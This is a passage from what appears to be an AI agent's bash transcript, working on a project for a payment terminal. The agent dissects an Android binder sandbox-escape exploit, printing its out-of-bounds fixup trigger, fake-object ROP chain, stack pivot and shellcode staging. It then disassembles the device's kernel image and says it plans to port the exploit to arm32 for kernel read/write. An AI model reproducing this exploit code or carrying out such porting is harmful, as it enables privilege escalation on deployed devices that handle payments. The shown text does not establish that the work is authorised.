+    if (res < 0) {
+        log_info("binder_write: ioctl failed (%s)\n",
+                strerror(errno));
+    }
+    return res;
+}
+
+/*
+ * This is just sending 0x100 commands to free the buffer in a row,
+ * saving us a few syscalls.
+ */


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref && grep -n \"smash\\|IResultReceiver\\|cookie\\|fake_object\\|write_ptr\\|0xe8\" sandbox/main.diff | grep -vE \"log|//\" | head -40"}

[tool • bash]
64:+            (uint64_t)txn->target.ptr, (uint64_t)txn->cookie, txn->code, txn->flags);
71:+                obj->hdr.type, obj->flags, (uint64_t)obj->binder, (uint64_t)obj->cookie);
250:+    data.txn.cookie = 0;
292:+            ptr += sizeof(struct binder_ptr_cookie);
377:+        struct binder_handle_cookie payload;
382:+    data.payload.cookie = (uintptr_t) death;
699:+    obj->cookie = 0;
713:+    obj->cookie = 0;
727:+    obj->cookie = 0;
838:+    obj->cookie = 0;
856:+    obj->cookie = 0;
1772:+int prepare_fake_object(uint32_t *fake_object, uint32_t fake_object_addr) {
1820:+  DO_LOG("[*] fake_object_addr: %x\n", fake_object_addr);
1824:+   * Since our stack pivot moves the stack to `fake_object`, we need to make sure this points
1830:+  fake_object[0] = fake_object_addr + offset_ref_base*sizeof(uint32_t) + 12; 
1888:+  fake_object[idx++] = gadgets[MMAP2_SVC].address;                           
1891:+  fake_object[idx++] = 0; 
1892:+  fake_object[idx++] = 0;
1893:+  fake_object[idx++] = 0;
1894:+  fake_object[idx++] = 0;
1914:+    fake_object[idx++] = gadgets[POP_R0_PC].address;
1915:+    fake_object[idx++] = copy_sc_addr + i*sizeof(uint32_t);
1916:+    fake_object[idx++] = gadgets[POP_R1_PC].address;
1917:+    fake_object[idx++] = copy_sc[i];
1918:+    fake_object[idx++] = gadgets[STR_R1_R0].address;
1928:+  fake_object[idx++] = gadgets[POP_LR_PC].address; 
1932:+  fake_object[idx++] = gadgets[POP_R0_R1_IP_SP_PC].address; 
1933:+  fake_object[idx++] = copy_sc_addr;
1934:+  fake_object[idx++] = copy_sc_addr + 0x1000;
1935:+  fake_object[idx++] = 0;
1961:+  fake_object[offset_ref_base] = (offset_ref_base + 1)*sizeof(uint32_t); /* This is used as an offset from the base object*/
1962:+  fake_object[offset_ref_base+1] = 0xdeadbeef;                           /* Unused */
1963:+  fake_object[offset_ref_base+2] = (uint32_t)utmp;                       /* Writable address in libc */
1966:+   * points to the beginning of our object (i.e to &fake_object[0]).
1969:+  fake_object[offset_ref_base +11] = gadgets[STACK_PIVOT].address;
2027:+  char *sc_addr = (char *)(&fake_object[offset_ref_base + 12]);
2163:+  fdo->cookie = 0;
2170:+  fdo->cookie = 0;
2177:+  fdo->cookie = 0;
2191:+  obj->cookie = 0;


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref && sed -n '/int stage1/,/^+}/p' sandbox/main.diff | grep -v \"^++\" | head -120"}

[tool • bash]
(no output)

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref && grep -n \"^+int \\|^+void \\|^+static \\|^+bool \" sandbox/main.diff | head -30"}

[tool • bash]
28:+void bio_init_from_txn(struct binder_io *io, struct binder_transaction_data *txn);
37:+void hexdump(void *_data, size_t len)
57:+void binder_dump_txn(struct binder_transaction_data *txn)
166:+void binder_close(struct binder_state *bs)
173:+int binder_become_context_manager(struct binder_state *bs)
178:+int binder_write(struct binder_state *bs, void *data, size_t len)
201:+void binder_free_buffers(struct binder_state *bs, binder_uintptr_t buffer_to_free)
222:+void binder_free_buffer(struct binder_state *bs,
234:+void binder_send_reply(struct binder_state *bs,
268:+int binder_parse(struct binder_state *bs, struct binder_io *bio,
357:+void binder_acquire(struct binder_state *bs, uint32_t target)
365:+void binder_release(struct binder_state *bs, uint32_t target)
373:+void binder_link_to_death(struct binder_state *bs, uint32_t target, struct binder_death *death)
386:+int binder_call(struct binder_state *bs,
394:+int binder_call2(struct binder_state *bs,
464:+int binder_call3(struct binder_state *bs,
535:+void binder_loop(struct binder_state *bs, binder_handler func)
572:+void binder_handle_transaction(struct binder_state *bs, binder_handler func)
608:+void bio_init_from_txn(struct binder_io *bio, struct binder_transaction_data *txn)
618:+void bio_init(struct binder_io *bio, void *data,
637:+void *bio_alloc(struct binder_io *bio, size_t size)
651:+void binder_done(struct binder_state *bs,
668:+static struct flat_binder_object *bio_alloc_obj(struct binder_io *bio)
684:+void bio_put_uint32(struct binder_io *bio, uint32_t n)
691:+void bio_put_null_obj(struct binder_io *bio) {
702:+void bio_put_obj(struct binder_io *bio, void *ptr)
716:+void bio_put_weak_obj(struct binder_io *bio, void *ptr)
734:+void bio_add_offset(struct binder_io *bio, uint64_t offset)
748:+void *bio_put_ptr(struct binder_io *bio, void *buffer, uint32_t size, uint32_t *off)
782:+void bio_fixup_ptr(struct binder_io *bio, void *base, uint32_t ptr_off)


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref && grep -n \"trigger_exploit\\|do_trans\\|stage\\|main(\" sandbox/main.diff | head; grep -n \"^\\+.*binder_transaction(bs\" sandbox/main.diff | head"}

[tool • bash]
1442:+ * Address and size of the second stage mapping.
2604:+ * Shellcode to copy and cacheflush a next stage shellcode. The following
2607:+ * 0x41424344 : src address where the next stage is located.
1691:+    binder_transaction(bs, false, handle, binder_data, max, NULL, 0);
2144:+   binder_transaction(bs, false, handle, binder_data, tr_size, NULL, 0);


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref && sed -n '2060,2260p' sandbox/main.diff | grep -v \"^\\+\\s*$\""}

[tool • bash]
+uint32_t exploit(uint8_t *exploit_data, size_t exploit_data_size) {
+  struct binder_write_read bwr;
+  uint32_t tr_size;
+  uint64_t offsets[128];
+  uint8_t sg_buf[0x1000];
+  uint32_t readbuf[32];
+  uint8_t *ptr = binder_data;
+  uint64_t *offs = offsets;
+  uint32_t buflen = 0;
+  struct binder_state mybs;
+  struct binder_state *bs = &mybs;
+  /*
+   * Used to perform BC_TRANSACTION_SG queries.
+   */
+  struct {
+          uint32_t cmd;
+          struct binder_transaction_data txn;
+          binder_size_t buffers_size;
+  } __attribute__((packed)) writebuf;
+  /* Start by finding our own /dev/binder mapping */
+  void *binder = find_mapping("/dev/binder", NULL, strcmp);
+  if (!binder) {
+    DO_LOG("[!] Could not find binder mapping\n");
+    return 0xdead;
+  }
+  DO_LOG("[*] Binder mapping at %p\n", binder);
+  /* Find also the binder file descriptor. Binder is open very early on,
+   * so it is expected to be within the first ~20 file descriptors. We 
+   * are iterating until 100 just in case.
+   */
+  bs->fd = -1;
+  for (int i=0; i < 100; i++) {
+    if (is_binder(i)) {
+      bs->fd = i;
+      break;
+    }
+  }
+  if (bs->fd == -1) {
+    DO_LOG("[!] Could not find binder fd :-/\n");
+    return 0xdead;
+  }
+  DO_LOG("[*] Found binder fd %d\n", bs->fd);
+  /*
+   * Find the handle of a binder object in the broker.
+   */
+  int handle = find_handle_by_interface(bs, IPARENT_PROCESS_INTERFACE);
+  if (handle == -1) {
+    DO_LOG("[!] Could not find IparentProcess handle !?\n");
+    return 0xdead;
+  }
+  DO_LOG("[*] IParentProcess handle is %d\n", handle);
+  /* Figure out how large a transaction we can send. */
+  tr_size = find_transaction_size(bs, handle);
+  DO_LOG("[*] Transaction size max %x\n", tr_size);  
+  /*
+   * Now we know that if we make a transaction of this size, it starts
+   * at the end of binder mapping - tr_size.
+   */
+  uint64_t user_address = (uint64_t)binder + 0xfe000 - tr_size;
+  DO_LOG("[*] Target user_address: %llx\n", user_address);
+  /*
+   * The purpose of this apparently useless transaction is to initialize the content of the qword at
+   * offset 0OOB_OFFSET_INDEX in the binder mapping. This is where the vulnerable code will try to 
+   * find an out-of-bounds offset later on, so we pre-initialize it.
+   */
+  *(uint64_t *)(binder_data + DATA_SIZE + OOB_OFFSET_INDEX*sizeof(binder_size_t)) = LEGIT_PTR_OFFSET; // offset of valid BINDER_TYPE_PTR
+   binder_transaction(bs, false, handle, binder_data, tr_size, NULL, 0);
+  /* Wait for the BR_REPLY. */
+  uint32_t remaining = 0, consumed = 0;
+  while (binder_read_next(bs, binder_data, &remaining, &consumed) != BR_REPLY);
+  memset(offsets, 0, 128 * sizeof(uint64_t));
+  /*
+   * Now craft the real transaction. Start with what's required by SHELL_COMMAND.
+   */
+  /* File descriptor x3 */
+  struct binder_fd_object *fdo = (struct binder_fd_object *)ptr;
+  fdo->hdr.type = BINDER_TYPE_FD;
+  fdo->fd = 0;
+  fdo->cookie = 0;
+  *(offs++) = ((uint8_t *)fdo) - binder_data;
+  ptr = (uint8_t *) ++fdo;
+  fdo = (struct binder_fd_object *)ptr;
+  fdo->hdr.type = BINDER_TYPE_FD;
+  fdo->fd = 0;
+  fdo->cookie = 0;
+  *(offs++) = ((uint8_t *)fdo) - binder_data;
+  ptr = (uint8_t *) ++fdo;
+  fdo = (struct binder_fd_object *)ptr;
+  fdo->hdr.type = BINDER_TYPE_FD;
+  fdo->fd = 0;
+  fdo->cookie = 0;
+  *(offs++) = ((uint8_t *)fdo) - binder_data;
+  ptr = (uint8_t *)++fdo;
+  /* uint32_t argc = 0 */
+  *(uint32_t *)ptr = 0;
+  ptr += 4;
+  /* IShellCallback = NULL */
+  struct flat_binder_object *obj = (struct flat_binder_object *)ptr;
+  obj->flags = 0;
+  obj->hdr.type = BINDER_TYPE_BINDER;
+  obj->binder = (uintptr_t)0;
+  obj->cookie = 0;
+  // NOTE: No need to add a NULL binder to offsets, Parcel.cpp allows this.
+  ptr = (uint8_t *) ++obj;
+  /*
+   * IResultReceiver. We'll palce the handle owned by the broker process here, 
+   * but the driver will translate it to a BINDER. Afterwards, we'll use the 
+   * bug to smash the cookie field and get code execution.
+   */
+  uint32_t ibinder_offset = ptr - binder_data;
+  DO_LOG("[*] Target binder offset: %x\n", ibinder_offset);
+  struct flat_binder_object *fbo = (struct flat_binder_object *)ptr;
+  fbo->hdr.type = BINDER_TYPE_HANDLE;
+  fbo->flags = 0;
+  fbo->handle = handle;
+  fbo->cookie = 0;
+  *(offs++) = ((uint8_t *)fbo) - binder_data;
+  ptr = (uint8_t *) ++fbo;
+  /* 
+   * Take note of the offset of the next object, since we'll need it later
+   * to perform a replacement when we trigger the bug.
+   */
+  uint64_t fake_ptr_offset = ptr - binder_data;
+  DO_LOG("[*] Fake PTR offset: %llx\n", fake_ptr_offset);
+  /*
+   * Here, we craft a BINDER_TYPE_PTR, which won't be added to the offset array, and will thus not be validated by the binder
+   * driver. It will be used later, once the bug is triggered, and we can make the `parent` pointer, point to this object.
+   * As it wasn't validated we can assign it an arbitrary length. The sole purpose of this object is to use the
+   * binder parent fixup code to overwrite a qword at an "arbitrary" offset with the userland address of a child buffer.
+   * This is the primitive which is used to overwrite the handle value of the BINDER_TYPE_HANDLE we created above.
+   *
+   * We need to make sure `bbo->buffer` is valid, otherwise the kernel will cause a BUG check. But we already took care
+   * of computing that above.
+   */
+  struct binder_buffer_object *bbo = (struct binder_buffer_object *)(ptr);
+  bbo->hdr.type = BINDER_TYPE_PTR;
+  bbo->flags = 0;
+  bbo->buffer = (binder_uintptr_t)user_address;
+  bbo->length = 0xdeadbeefbadc0ded;
+  bbo->parent = 0;
+  bbo->parent_offset = 0;
+  ptr = (uint8_t*)++bbo;
+  /* Add a BINDER_TYPE_PTR which gets validated by the driver. */
+  DO_LOG("[*] Valid PTR offset: %x\n", ptr - binder_data);
+  /* Sanity check: verify the offset of the next object matches what we expected */
+  if ((ptr - binder_data) != LEGIT_PTR_OFFSET) {
+    DO_LOG("[!] Legitimate PTR offset does not match LEGIT_PTR_OFFSET. (expected: %x, defined as: %x)\n", ptr-binder_data, LEGIT_PTR_OFFSET);
+    return 0xdead;
+  }
+  bbo->hdr.type = BINDER_TYPE_PTR;
+  bbo->flags = 0;
+  bbo->buffer = (binder_uintptr_t)sg_buf;
+  bbo->length = 0x10;
+  bbo->parent = 0;
+  bbo->parent_offset = 0;
+  // Add it to the offsets array
+  *(offs++) = ((uint8_t *)bbo) - binder_data;
+  ptr = (uint8_t*)++bbo;
+  /* We create an additionnal BINDER_TYPE_PTR, whose parent will be the one we created just above. This is where the bug is triggered,
+   * as the bbo->parent index is set to `OOB_OFFSET_INDEX` which is wrong as it is > to the number of offsets in the offsets array. offs[OOB_OFFSET_INDEX] 
+   * will thus end up pointing in not yet initalized data reserved for the sg_buf. The whole purpose of the seemingly useless first transaction was to initialize this address with the 


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref && sed -n '2260,2420p' sandbox/main.diff | grep -v \"^\\+\\s*$\" | head -100"}

[tool • bash]
+   * will thus end up pointing in not yet initalized data reserved for the sg_buf. The whole purpose of the seemingly useless first transaction was to initialize this address with the 
+   * value 0x40, which is the offset of the previous BINDER_TYPE_PTR object in order for the `binder_validate_ptr` and `binder_valid_fixup` function to succeed.
+   * This BINDER_TYPE_PTR is then eventually validated and the `last_fixup_obj_off` is set to the offset of this object.
+   * This implies that we just validated a BINDER_TYPE_PTR whose bbo->parent index points into an array entry which will be modified by the next BINDER_TYPE_PTR below,
+   * that the driver will process.
+   */
+  bbo->hdr.type = BINDER_TYPE_PTR;
+  bbo->flags = BINDER_BUFFER_FLAG_HAS_PARENT;
+  bbo->buffer = 0;
+  bbo->length = 0;
+  bbo->parent = OOB_OFFSET_INDEX;
+  bbo->parent_offset = 0;
+  buflen += bbo->length;
+  // Add it to the offsets array
+  *(offs++) = ((uint8_t *)bbo) - binder_data;
+  ptr = (uint8_t *)++bbo;
+  /* 
+   * And finally, the last nail in the coffin.
+   * We craft the almost exact same BINDER_TYPE_PTR as above, still having a parent index of OOB_OFFSET_INDEX. This time however, we specify a 'buffer', whose data will be copied from
+   * before validating the BINDER_TYPE_PTR. This qword will overwrite the value at offs[OOB_OFFSET_INDEX], replacing the value pointing to a validated BINDER_TYPE_PTR, with the value fake_ptr_offset,
+   * which points to the very first BINDER_TYPE_PTR, which wasn't validated by the binder driver as we haven't added it's offset to the offsets array. The following will now happen
+   * in `binder_fixup_parent()`:
+   * ```c
+     2884         parent = binder_validate_ptr(target_proc, b, &object, bp->parent,
+     2885                                      off_start_offset, &parent_offset,
+     2886                                      num_valid);
+     ...
+     2893         if (!binder_validate_fixup(target_proc, b, off_start_offset,
+     2894                                    parent_offset, bp->parent_offset,
+     2895                                    last_fixup_obj_off,
+     2896                                    last_fixup_min_off)) {
+     2897                 binder_user_error("%d:%d got transaction with out-of-order buffer fixup\n",
+     2898                                   proc->pid, thread->pid);
+     2899                 return -EINVAL;
+     2900         }
+   * ```
+   * Here, parent will now point to the unvalidated BINDER_TYPE_PTR, however, to be used by the driver it needs to be validated by the `binder_validate_fixup()` function:
+   * ```c
+   * 2414 static bool binder_validate_fixup(struct binder_proc *proc,
+     2415                                   struct binder_buffer *b,
+     2416                                   binder_size_t objects_start_offset,
+     2417                                   binder_size_t buffer_obj_offset,
+     2418                                   binder_size_t fixup_offset,
+     2419                                   binder_size_t last_obj_offset,
+     2420                                   binder_size_t last_min_offset)
+     2421 {
+     ...
+     2427         while (last_obj_offset != buffer_obj_offset) {
+     2428                 unsigned long buffer_offset;
+     2429                 struct binder_object last_object;
+     2430                 struct binder_buffer_object *last_bbo;
+     2431                 size_t object_size = binder_get_object(proc, b, last_obj_offset,
+     2432                                                        &last_object);
+     2433                 if (object_size != sizeof(*last_bbo))
+     2434                         return false;
+     2435
+     2436                 last_bbo = &last_object.bbo;
+     2437                 *
+     2438                 * Safe to retrieve the parent of last_obj, since it
+     2439                 * was already previously verified by the driver.
+     2440                 *
+     2441                 if ((last_bbo->flags & BINDER_BUFFER_FLAG_HAS_PARENT) == 0)
+     2442                         return false;
+     2443                 last_min_offset = last_bbo->parent_offset + sizeof(uintptr_t);
+     2444                 buffer_offset = objects_start_offset +
+     2445                         sizeof(binder_size_t) * last_bbo->parent,
+     2446                 binder_alloc_copy_from_buffer(&proc->alloc, &last_obj_offset,
+     2447                                               b, buffer_offset,
+     2448                                               sizeof(last_obj_offset));
+     2449         }
+     2450         return (fixup_offset >= last_min_offset);
+     2451 }
+    ```
+    Here, as the `last_bbo` pointer was previously validated by the driver, it is trusted, and it particular, its `parent` field is trusted. However, the value of
+    last_bbo->parent is now `fake_ptr_offset` instead of `LEGIT_PTR_OFFSET`, which ends up setting `last_obj_offset` to the same value as `buffer_obj_offset` (which is the offset of the
+    fake BINDER_TYPE_PTR), and exists the loop. From now on, the driver will be manipulating and unvalidated object. The following code will try to fixup the buffer address
+    in the fake BINDER_TYPE_PTR object:
+    ```c
+    2909         buffer_offset = bp->parent_offset +
+    2910                         (uintptr_t)parent->buffer - (uintptr_t)b->user_data;
+    2911         binder_alloc_copy_to_buffer(&target_proc->alloc, b, buffer_offset,
+    2912                                     &bp->buffer, sizeof(bp->buffer));
+    ```
+    As the parent->buffer is equal to b->user_data, only the parent_offset is taken into account. This means that the userland address of the
+    bp->buffer will smash the `bp->binder` field of the IResultReceiver BINDER_TYPE_BINDER object we sent earlier.
+   */
+  uint64_t new_off = fake_ptr_offset;
+  bbo->hdr.type = BINDER_TYPE_PTR;
+  bbo->flags = BINDER_BUFFER_FLAG_HAS_PARENT;
+  bbo->buffer = (binder_uintptr_t)&new_off;
+  bbo->length = sizeof(new_off);
+  bbo->parent = OOB_OFFSET_INDEX; // offs[OOB_OFFSET_INDEX] = fake_ptr_offset;
+  bbo->parent_offset = ibinder_offset + offsetof(struct flat_binder_object, binder);
+  *(offs++) = ((uint8_t *)bbo) - binder_data;
+  ptr = (uint8_t*)++bbo;
+  /*
+   * Now we will do a similar trick, but this time point the `bp->cookie` field to a 
+   * large buffer that will be added to the `sg_buf` area.
+   *
+   * This `cookie` value gets casted to an IBinder object, so we end up controlling


[assistant]
<acp tokens="193" type="text" time="2026-11-15 10:51:37">m03909</acp>
**Sandbox exploit fully dissected too.** The full picture is now in hand — both variants work off the same trigger primitive (OOB `offs[OOB_OFFSET_INDEX]` → unvalidated fake PTR → `binder_fixup_parent` copy), sandbox just aims the smash at a Chromium C++ vtable in the browser process instead of a fake kernel node. For kernel R/W I need the arm32 wire layout — and since binder's UAPI structs (`binder_size_t`/`binder_uintptr_t` = u64) are arch-independent on 4.14, **BFS's transaction buffers port near-verbatim**. The only real port deltas are: arm32 `struct binder_node` kernel offsets, kmalloc-96 slab, and epitem geometry.

Before writing code I need the exact 4.14 source truth for `binder_node` layout and the fixup loop — fetching the android-4.14 binder sources:

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && mkdir -p kern_ref && cd kern_ref && for f in binder.c binder_alloc.c uapi/binder.h; do n=$(basename $f); curl -s \"https://android.googlesource.com/kernel/common/+/refs/heads/android-4.14/drivers/android/$f?format=TEXT\" | base64 -d > \"414_$n\" 2>/dev/null; echo \"$n: $(wc -c < 414_$n) bytes, first line: $(head -c 60 414_$n | head -1 | tr -d '\\n')\"; done"}

[tool • bash]
binder.c: 2 bytes, first line: 4�
binder_alloc.c: 2 bytes, first line: 4�
binder.h: 2 bytes, first line: 4�


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && for f in binder.c binder_alloc.c; do curl -sL \"https://raw.githubusercontent.com/LineageOS/android_kernel_common/android-4.14/drivers/android/$f\" -o \"414_$f\"; done; curl -sL \"https://raw.githubusercontent.com/LineageOS/android_kernel_common/android-4.14/include/uapi/linux/android/binder.h\" -o 414_binder.h; wc -c 414_*; head -5 414_binder.c"}

[tool • bash]
14 414_binder_alloc.c
14 414_binder.c
14 414_binder.h
42 total
404: Not Found

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && rm -f 414_*; curl -sL \"https://raw.githubusercontent.com/torvalds/linux/master/drivers/android/binder.c\" -o 5x_binder.c; head -3 5x_binder.c; curl -sL \"https://raw.githubusercontent.com/torvalds/linux/v4.14/drivers/android/binder.c\" -o try_binder.c; head -3 try_binder.c; wc -c 5x_binder.c try_binder.c"}

[tool • bash]
404: Not Found/* binder.c
 *
 * Android IPC Subsystem
    14 5x_binder.c
161788 try_binder.c
161802 total


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && mv try_binder.c 414_binder.c && curl -sL \"https://raw.githubusercontent.com/torvalds/linux/v4.14/drivers/android/binder_alloc.c\" -o 414_binder_alloc.c && curl -sL \"https://raw.githubusercontent.com/torvalds/linux/v4.14/include/uapi/linux/android/binder.h\" -o 414_binder.h && wc -c 414_*; echo \"=== struct binder_node ===\"; sed -n '/^struct binder_node {/,/^};/p' 414_binder.c"}

[tool • bash]
   313 414_binder_alloc.c
161788 414_binder.c
 13687 414_binder.h
175788 total
=== struct binder_node ===
struct binder_node {
	int debug_id;
	spinlock_t lock;
	struct binder_work work;
	union {
		struct rb_node rb_node;
		struct hlist_node dead_node;
	};
	struct binder_proc *proc;
	struct hlist_head refs;
	int internal_strong_refs;
	int local_weak_refs;
	int local_strong_refs;
	int tmp_refs;
	binder_uintptr_t ptr;
	binder_uintptr_t cookie;
	struct {
		/*
		 * bitfield elements protected by
		 * proc inner_lock
		 */
		u8 has_strong_ref:1;
		u8 pending_strong_ref:1;
		u8 has_weak_ref:1;
		u8 pending_weak_ref:1;
	};
	struct {
		/*
		 * invariant after initialization
		 */
		u8 accept_fds:1;
		u8 min_priority;
	};
	bool has_async_transaction;
	struct list_head async_todo;
};


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && grep -E \"binder_transaction_buffer|binder_free_buf|binder_get_node|binder_dec_node|binder_translate\" tmp/m3/kallsyms_root.txt | grep -v ksx | head -20"}

[tool • bash]
c087d7f4 t binder_get_node_ilocked
c0880900 t binder_dec_node_nilocked
c0880aec t binder_dec_node
c0880b48 t binder_dec_node_tmpref
c0881468 t binder_translate_fd
c0882bac t binder_translate_binder
c0884c50 t binder_transaction_buffer_release
c088a2b8 t binder_free_buf_locked
c0e90694 r __tracepoint_ptr_binder_transaction_buffer_release
c0e93abd r __tpstrtab_binder_transaction_buffer_release
c10a1140 t __event_binder_transaction_buffer_release
c1218564 d event_binder_transaction_buffer_release
c123df28 D __tracepoint_binder_transaction_buffer_release


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && python3 - <<'PYEOF'\nimport subprocess,bisect,re\nKS='tmp/m3/kallsyms_root.txt'; IMG='tmp/m3/zImage.bin'; BASE=0xc0008000\nsyms={}; addrs=[]\nfor ln in open(KS,errors='ignore'):\n    p=ln.split()\n    if len(p)>=3 and len(p[0])==8 and p[0].startswith(('c0','c1')):\n        try: va=int(p[0],16); syms[p[2]]=va; addrs.append(va)\n        except: pass\naddrs.sort()\ndef endof(va):\n    i=bisect.bisect_right(addrs,va)\n    return addrs[i] if i<len(addrs) and addrs[i]>va else va+0x800\ndata=open(IMG,'rb').read()\ndef dis(name,maxlen=0x2000,show=False):\n    va=syms.get(name)\n    if va is None: print('MISSING',name); return []\n    end=min(endof(va),va+maxlen); off=va-BASE\n    fn='tmp/m3/slc_%s.bin'%name\n    open(fn,'wb').write(data[off:off+(end-va)])\n    out=subprocess.run(['arm-none-eabi-objdump','-D','-b','binary','-marm','--adjust-vma=%#x'%va,fn],capture_output=True,text=True).stdout\n    lines=[]\n    for l in out.splitlines():\n        m=re.match(r'^([0-9a-f]{8}):\\s+([0-9a-f ]{8})\\s*(.*)',l)\n        if m: lines.append((int(m.group(1),16),m.group(3).strip()))\n    open('tmp/m3/dis2_%s.txt'%name,'w').write('\\n'.join('%08x  %s'%(a,l) for a,l in lines))\n    return lines\n# Where does binder_transaction_buffer_release call dec_node? Find str/ldr around\nfor fn in ['binder_transaction_buffer_release','binder_translate_binder']:\n    lines=dis(fn)\n    print('===',fn,hex(syms[fn]),len(lines),'insns')\n    for a,l in lines:\n        if re.search(r'bl\\s+0x',l):\n            t=l.split('0x')[1].strip()\n            try: tv=int(t,16)\n            except: continue\n            nm=[k for k,v in syms.items() if v==tv]\n            print('  %08x %s -> %s'%(a,l,nm[0] if nm else '?'))\nPYEOF"}

[tool • bash]
=== binder_transaction_buffer_release 0xc0884c50 301 insns
  c0884c64 bl	0xc0110884 -> __gnu_mcount_nc
  c0884cb8 bl	0xc018ede0 -> printk
  c0884cd0 bl	0xc0880aec -> binder_dec_node
  c0884d54 bl	0xc088b444 -> binder_alloc_copy_from_buffer
  c0884d68 bl	0xc087e110 -> binder_get_object
  c0884d88 bl	0xc018ede0 -> printk
  c0884e08 bl	0xc087d4ac -> _binder_inner_proc_lock
  c0884e18 bl	0xc087d7f4 -> binder_get_node_ilocked
  c0884e28 bl	0xc087d560 -> _binder_inner_proc_unlock
  c0884e5c bl	0xc018ede0 -> printk
  c0884e7c bl	0xc0880aec -> binder_dec_node
  c0884e84 bl	0xc0880b48 -> binder_dec_node_tmpref
  c0884eac bl	0xc08824ec -> binder_update_ref_for_handle
  c0884ec4 bl	0xc018ede0 -> printk
  c0884f04 bl	0xc018ede0 -> printk
  c0884f1c bl	0xc087e40c -> task_close_fd
  c0884f68 bl	0xc087e240 -> binder_validate_ptr
  c0884f7c bl	0xc018ede0 -> printk
  c0884ffc bl	0xc018ede0 -> printk
  c0885068 bl	0xc088b444 -> binder_alloc_copy_from_buffer
  c0885074 bl	0xc087e40c -> task_close_fd
  c088508c bl	0xc018ede0 -> printk
  c08850b4 bl	0xc012b218 -> __stack_chk_fail
=== binder_translate_binder 0xc0882bac 178 insns
  c0882bc0 bl	0xc0110884 -> __gnu_mcount_nc
  c0882bf4 bl	0xc087d4ac -> _binder_inner_proc_lock
  c0882c04 bl	0xc087d7f4 -> binder_get_node_ilocked
  c0882c14 bl	0xc087d560 -> _binder_inner_proc_unlock
  c0882c30 bl	0xc088293c -> binder_new_node
  c0882c90 bl	0xc018ede0 -> printk
  c0882cb8 bl	0xc0445014 -> security_binder_transfer_binder
  c0882cf4 bl	0xc0881904 -> binder_inc_ref_for_node
  c0882df0 bl	0xc0b01d88 -> preempt_schedule_notrace
  c0882e20 bl	0xc018ede0 -> printk
  c0882e28 bl	0xc0880b48 -> binder_dec_node_tmpref
  c0882e40 bl	0xc012b218 -> __stack_chk_fail


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && sed -n '/^c0882810/,/^c088286[0-9a-f]/p' tmp/m3/dis2_binder_proc_transaction.txt 2>/dev/null | head -40; echo \"=== find binder_proc_transaction ===\"; grep -E \" (t|T) binder_(proc_transaction|get_thread|alloc_new_buf) \" tmp/m3/kallsyms_root.txt; echo \"=== dec-node call region in buffer_release ===\"; sed -n '/^c0884cb0/,/^c0884ce0/p' tmp/m3/dis2_binder_transaction_buffer_release.txt"}

[tool • bash]
=== find binder_proc_transaction ===
=== dec-node call region in buffer_release ===
c0884cb0  mov	r2, r7
c0884cb4  ldr	r3, [r4, #32]
c0884cb8  bl	0xc018ede0
c0884cbc  ldr	r0, [r4, #28]
c0884cc0  cmp	r0, #0
c0884cc4  beq	0xc0884cd4
c0884cc8  mov	r1, #1
c0884ccc  mov	r2, #0
c0884cd0  bl	0xc0880aec
c0884cd4  ldr	r1, [r4, #32]
c0884cd8  mov	r3, #0
c0884cdc  add	r1, r1, #3
c0884ce0  bic	r1, r1, #3


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && for f in binder.c binder_alloc.c; do :; done; cd kern_ref && sed -n '/static int binder_translate_binder/,/^}/p' 414_binder.c | head -75"}

[tool • bash]
static int binder_translate_binder(struct flat_binder_object *fp,
				   struct binder_transaction *t,
				   struct binder_thread *thread)
{
	struct binder_node *node;
	struct binder_proc *proc = thread->proc;
	struct binder_proc *target_proc = t->to_proc;
	struct binder_ref_data rdata;
	int ret = 0;

	node = binder_get_node(proc, fp->binder);
	if (!node) {
		node = binder_new_node(proc, fp);
		if (!node)
			return -ENOMEM;
	}
	if (fp->cookie != node->cookie) {
		binder_user_error("%d:%d sending u%016llx node %d, cookie mismatch %016llx != %016llx\n",
				  proc->pid, thread->pid, (u64)fp->binder,
				  node->debug_id, (u64)fp->cookie,
				  (u64)node->cookie);
		ret = -EINVAL;
		goto done;
	}
	if (security_binder_transfer_binder(proc->tsk, target_proc->tsk)) {
		ret = -EPERM;
		goto done;
	}

	ret = binder_inc_ref_for_node(target_proc, node,
			fp->hdr.type == BINDER_TYPE_BINDER,
			&thread->todo, &rdata);
	if (ret)
		goto done;

	if (fp->hdr.type == BINDER_TYPE_BINDER)
		fp->hdr.type = BINDER_TYPE_HANDLE;
	else
		fp->hdr.type = BINDER_TYPE_WEAK_HANDLE;
	fp->binder = 0;
	fp->handle = rdata.desc;
	fp->cookie = 0;

	trace_binder_transaction_node_to_ref(t, node, &rdata);
	binder_debug(BINDER_DEBUG_TRANSACTION,
		     "        node %d u%016llx -> ref %d desc %d\n",
		     node->debug_id, (u64)node->ptr,
		     rdata.debug_id, rdata.desc);
done:
	binder_put_node(node);
	return ret;
}


[assistant • bash]
